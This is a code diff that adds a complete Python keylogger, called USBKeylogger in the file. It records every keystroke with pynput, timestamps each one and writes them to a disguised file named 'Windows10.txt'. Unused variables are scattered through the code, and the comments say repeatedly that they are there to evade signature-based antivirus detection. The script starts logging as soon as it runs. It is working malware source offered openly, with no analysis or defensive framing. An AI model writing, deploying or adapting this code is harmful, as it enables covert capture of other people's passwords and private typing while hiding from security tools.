@@ -1,0 +1,99 @@
+import pynput.keyboard
+import threading
+from datetime import datetime, timedelta
+import os
+
+class USBKeylogger:
+    def __init__(self):
+        self.logger = ""  # String to store the entire log
+        self.char_count = 0  # Count of characters to control flushing
+        self.char_limit = 10  # Character limit to trigger flushing
+        self.flush_interval = 10  # Interval (in seconds) to flush the buffer to the log file
+        self.inactivity_timeout = timedelta(minutes=1)  # Timeout for inactivity
+        self.last_activity_time = datetime.now()  # Track the last activity time
+        # File path for the log file
+        self.log_file_path = os.path.join(os.getcwd(), "Windows10.txt")
+        # Random unused variables to help evade simple signature-based detection
+        random_var1 = "random_string_1"
+        random_var2 = "random_string_2"
+        random_var3 = "random_string_3"
+
+    def append_to_log(self, key_strike):
+        # Append the key strike with a timestamp and a newline to the logger
+        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        self.logger += f"{timestamp} - {key_strike}\n"
+        self.char_count += 1  # Increment character count
+        # Random unused variables to help evade simple signature-based detection
+        random_var4 = "random_string_4"
+        random_var5 = "random_string_5"
+        random_var6 = "random_string_6"
+        # Update the last activity time
+        self.last_activity_time = datetime.now()
+        # Flush the logger to the log file if character count exceeds limit
+        if self.char_count >= self.char_limit:
+            self.flush_buffer()
+
+    def flush_buffer(self):
+        # Flush the logger content to the log file
+        if self.logger:
+            print(self.logger)  # Print the log to the console (for debugging purposes)
+            # Write the log to the file
+            with open(self.log_file_path, "a+", encoding="utf-8") as new_file:
+                new_file.write(self.logger)
+            # Reset the logger and character count after flushing
+            self.logger = ""
+            self.char_count = 0
+
+    def evaluate_keys(self, key):
+        try:
+            # If the key is alphanumeric (letter or number), add it directly to the log
+            if hasattr(key, 'char') and key.char:
+                self.append_to_log(key.char)
+            elif hasattr(key, 'vk') and 96 <= key.vk <= 105:
+                # Handle numpad keys
+                self.append_to_log(str(key.vk - 96))
+            elif hasattr(key, 'vk') and 48 <= key.vk <= 57:
+                # Handle top row number keys
+                self.append_to_log(chr(key.vk))
+            else:
+                # If the key is not alphanumeric, log the special key
+                self.append_to_log(str(key))
+            # Random unused variables to help evade simple signature-based detection
+            random_var7 = "random_string_7"
+            random_var8 = "random_string_8"
+        except AttributeError:
+            # Handle the case for special keys or function keys
+            self.append_to_log(str(key))
+            # Random unused variables to help evade simple signature-based detection
+            random_var9 = "random_string_9"
+            random_var10 = "random_string_10"
+
+    def check_inactivity(self):
+        # Check if there has been no activity for the timeout period
+        if datetime.now() - self.last_activity_time >= self.inactivity_timeout:
+            self.flush_buffer()
+        # Set up the next check
+        threading.Timer(10, self.check_inactivity).start()
+
+    def start(self):
+        # Random unused variables to help evade simple signature-based detection
+        random_var11 = "random_string_11"
+        random_var12 = "random_string_12"
+        # Set up the keyboard listener to call evaluate_keys on key press
+        keyboard_listener = pynput.keyboard.Listener(on_press=self.evaluate_keys)
+        with keyboard_listener:
+            self.logger = ""  # Reset the logger
+            self.start_flush_timer()  # Start the timer to periodically flush the buffer
+            self.check_inactivity()  # Start the inactivity check
+            keyboard_listener.join()  # Start the listener
+
+    def start_flush_timer(self):
+        # Set up a timer to call flush_buffer at regular intervals (flush_interval)
+        threading.Timer(self.flush_interval, self.flush_buffer).start()
+
+# Random unused variables to help evade simple signature-based detection
+random_var13 = "random_string_13"
+random_var14 = "random_string_14"
+
+# Start the keylogger
+USBKeylogger().start()
